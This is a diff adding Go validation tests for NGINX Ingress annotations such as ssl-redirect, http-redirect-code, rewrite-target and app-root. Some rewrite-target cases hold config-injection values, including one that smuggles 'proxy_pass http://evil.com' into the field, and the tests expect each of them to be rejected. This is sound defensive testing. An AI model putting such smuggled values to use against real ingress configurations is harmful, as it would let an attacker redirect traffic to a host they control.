@@ -1424,6 +1424,35 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 
 		{
 			annotations: map[string]string{
+				"nginx.org/ssl-redirect": "true",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/ssl-redirect annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/ssl-redirect": "not_a_boolean",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors: []string{
+				`annotations.nginx.org/ssl-redirect: Invalid value: "not_a_boolean": must be a boolean`,
+			},
+			msg: "invalid nginx.org/ssl-redirect annotation",
+		},
+
+		{
+			annotations: map[string]string{
 				"ingress.kubernetes.io/ssl-redirect": "true",
 			},
 			specServices:          map[string]bool{},
@@ -1449,6 +1478,104 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 				`annotations.ingress.kubernetes.io/ssl-redirect: Invalid value: "not_a_boolean": must be a boolean`,
 			},
 			msg: "invalid ingress.kubernetes.io/ssl-redirect annotation",
+		},
+
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "301",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/http-redirect-code annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "302",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/http-redirect-code annotation with 302",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "307",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/http-redirect-code annotation with 307",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "308",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/http-redirect-code annotation with 308",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http-redirect-code: Required value`,
+			},
+			msg: "invalid nginx.org/http-redirect-code annotation, empty string",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "200",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http-redirect-code: Invalid value: "200": status code out of accepted range. accepted values are '301', '302', '307', '308'`,
+			},
+			msg: "invalid nginx.org/http-redirect-code annotation, invalid code",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/http-redirect-code": "invalid",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			directiveAutoAdjust:   false,
+			expectedErrors: []string{
+				`annotations.nginx.org/http-redirect-code: Invalid value: "invalid": invalid redirect code: strconv.Atoi: parsing "invalid": invalid syntax`,
+			},
+			msg: "invalid nginx.org/http-redirect-code annotation, not a number",
 		},
 
 		{
@@ -2889,7 +3016,8 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 			},
 			specServices: map[string]bool{
 				"service-1": true,
-			}, isPlus: false,
+			},
+			isPlus:                false,
 			appProtectEnabled:     false,
 			appProtectDosEnabled:  false,
 			internalRoutesEnabled: false,
@@ -3012,7 +3140,8 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 			},
 			specServices: map[string]bool{
 				"service-1": true,
-			}, isPlus: false,
+			},
+			isPlus:                false,
 			appProtectEnabled:     false,
 			appProtectDosEnabled:  false,
 			internalRoutesEnabled: false,
@@ -3368,6 +3497,34 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 		},
 		{
 			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/foo/$1; } path / { my/location/test/ }",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "/foo/$1; } path / { my/location/test/ }": NGINX configuration syntax characters (;{}) and []|<>,^` + "`" + `~ not allowed in rewrite target`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, NGINX configuration syntax characters (;{}) not allowed in rewrite target",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api\npath",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/rewrite-target: Invalid value: "/api\npath": control characters not allowed in rewrite target`,
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, control characters not allowed in rewrite target",
+		},
+		{
+			annotations: map[string]string{
 				"nginx.org/rewrite-target": "api/users",
 			},
 			specServices:          map[string]bool{},
@@ -3379,6 +3536,170 @@ func TestValidateNginxIngressAnnotations(t *testing.T) {
 				`annotations.nginx.org/rewrite-target: Invalid value: "api/users": rewrite target must start with /`,
 			},
 			msg: "invalid nginx.org/rewrite-target annotation, does not start with slash",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/api/v1`; proxy_pass http://evil.com; #",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/api/v1`; proxy_pass http://evil.com; #\": NGINX configuration syntax characters (;{}) and []|<>,^`~ not allowed in rewrite target",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, backtick and semicolon injection",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/rewrite-target": "/path/$1|/backup/$1",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				"annotations.nginx.org/rewrite-target: Invalid value: \"/path/$1|/backup/$1\": NGINX configuration syntax characters (;{}) and []|<>,^`~ not allowed in rewrite target",
+			},
+			msg: "invalid nginx.org/rewrite-target annotation, pipe character for alternatives",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/app-root annotation",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee/mocha",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors:        nil,
+			msg:                   "valid nginx.org/app-root annotation with nested path",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "coffee",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "coffee": must start with '/'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, does not start with slash",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/": cannot be '/'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, cannot be root path",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee/",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/coffee/": path should not end with '/'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, cannot end with slash",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea$1",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/tea$1": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid nginx.org/app-root annotation, contains dollar sign",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea~1",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/tea~1": path must not contain the '~' character`,
+			},
+			msg: "invalid nginx.org/app-root annotation, contains tilde",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/coffee{test}",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/coffee{test}": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid app-root - contains curly braces",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea;chai",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/tea;chai": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid app-root - contains semicolon",
+		},
+		{
+			annotations: map[string]string{
+				"nginx.org/app-root": "/tea chai",
+			},
+			specServices:          map[string]bool{},
+			isPlus:                false,
+			appProtectEnabled:     false,
+			appProtectDosEnabled:  false,
+			internalRoutesEnabled: false,
+			expectedErrors: []string{
+				`annotations.nginx.org/app-root: Invalid value: "/tea chai": path must not contain the following characters: whitespace, '{', '}', ';', '$', '|', '^', '<', '>', '\', '"', '#', '[', ']'`,
+			},
+			msg: "invalid app-root - contains whitespace",
 		},
 	}
 
